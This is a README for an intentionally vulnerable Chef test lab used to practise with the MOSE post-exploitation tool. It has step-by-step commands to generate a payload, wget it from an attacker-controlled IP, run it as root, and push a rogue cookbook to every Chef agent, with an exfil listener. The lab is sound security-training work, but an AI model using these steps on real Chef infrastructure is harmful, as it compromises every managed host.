# chef-test-lab
[![License](http://img.shields.io/:license-mit-blue.svg)](https://github.com/master-of-servers/chef-test-lab/blob/master/LICENSE)
[![Build Status](https://dev.azure.com/jaysonegrace/chef-test-lab/_apis/build/status/master-of-servers.chef-test-lab?branchName=master)](https://dev.azure.com/jaysonegrace/chef-test-lab/_build/latest?definitionId=36&branchName=master)

Used to create a test lab that can be used to work with MOSE and Chef.

**Warning, take heed: This lab should be run in a controlled environment; it contains vulnerable assets.**

## Dependencies
You must download and install the following for this environment to work:
* [Vagrant](https://www.vagrantup.com/downloads.html)
* [Docker](https://docs.docker.com/install/)
* [Docker Compose](https://docs.docker.com/compose/install/)

## Vagrant Lab Build Instructions
To create an environment with a Chef Workstation and a Chef Server that controls multiple agents, run the following command:
```
cd vagrant && make build && make run
```

### To run MOSE against the vagrant chef workstation:

1. Build MOSE using `make build` in the MOSE repo
2. Generate a payload with MOSE: `./mose -c "touch /tmp/BLA && echo test >> /tmp/BLA" -t chef`
3. Login to the chef workstation: `vagrant ssh chef_workstation` (the password is vagrant)
4. Escalate to root with `sudo su`
5. Download the binary from MOSE: `wget http://YOURIPADDRESSGOESHERE:8090/chef-linux`
6. Run the payload: `chmod +x chef-linux; ./chef-linux`
7. Wait for 30 minutes or ssh into one of the agents and kick off the payload manually: `vagrant ssh chef_agent_1` (the password is vagrant) <br>
	7a. Escalate to root with ```sudo su``` <br>
	7b. Run ```chef-client```
8. For this example, you should note that a file has been created in `/tmp` in all of the chef-agent virtual machines, as we specified in step 2.

### To run MOSE against the vagrant chef server:

1. Build MOSE using `make build` in the MOSE repo
2. Generate a payload with MOSE: `./mose -c "touch /tmp/BLA && echo test >> /tmp/BLA" -t chef -l <your local ip address> -ep 9090 -rhost chef-server:10.42.42.10` <br>
	2a. The exfil listener time can be set with the `-ep` parameter <br>
	2b. The `-rhost` parameter is a necessity if running against a chef-server.  
3. Login to the chef server: `vagrant ssh chef_server` (the password is vagrant)
4. Escalate to root with `sudo su`
5. Download the binary from MOSE: `wget http://YOURIPADDRESSGOESHERE:8090/chef-linux`
6. Back on the attacker's system, specify `n` for the target being a workstation and `Y` when prompted for the target being a server
7. Run the payload: `chmod +x chef-linux; ./chef-linux`
8. Use the container that is spawned on the attacking machine as if it were a workstation to get the rogue cookbook into place
9. Wait for 30 minutes or ssh into one of the agents and kick off the payload manually: `vagrant ssh chef_agent_1` (the password is vagrant) <br>
	9a. Escalate to root with ```sudo su``` <br>
	9b. Run ```chef-client```
10. For this example, you should note that a file has been created in `/tmp` in all of the chef-agent virtual machines, as we specified in step 2.

## Docker Lab Build Instructions
To create an environment with a Chef Workstation and a Chef Server that controls a single agent, run the following command:
```
cd docker/basic && make run
```

### To run MOSE against the docker chef workstation:

1. Build MOSE using `make build` in the MOSE repo
2. Wait for 15 minutes or so for the environment to start working. You can track the progress with this command: `while true; do sleep 2; docker logs basic-chef-workstation; done`. You will know it's done when you see this:
```
id:       mysql_pw
password: TheM0stS3cr3T!!!
user:     mysql
```
3. Generate a payload with MOSE: `./mose -c "touch /tmp/test.txt && echo test >> /tmp/test.txt" -t chef -f "${PWD}/payloads/chef-linux"` and be sure to answer `Y` when prompted.
4. Transfer the payload to the chef workstation container: `docker cp payloads/chef-linux basic-chef-workstation:/chef-linux` 
5. Run the payload: `docker exec -i basic-chef-workstation /bin/bash -c "echo 'n' | /chef-linux"`
6. Wait for 30 minutes or exec into the agent and kick off the payload manually: `docker exec -i basic-chef-agent-1 /bin/bash -c "chef-client"`
7. Observe that a file has been created on the agent in `/tmp`: `docker exec -i basic-chef-agent-1 /bin/bash -c "cat /tmp/test.txt"`

**Please note:**
The docker lab does not support transferring payloads to the target via the web server. You can however generate a payload with the `-f` parameter and transfer it via `docker cp`. 

To tear down the test environment, run the following command:
```
make destroy
```

## Credits
The chef server docker container is provided courtesy of this repo: https://github.com/c-buisson/chef-server
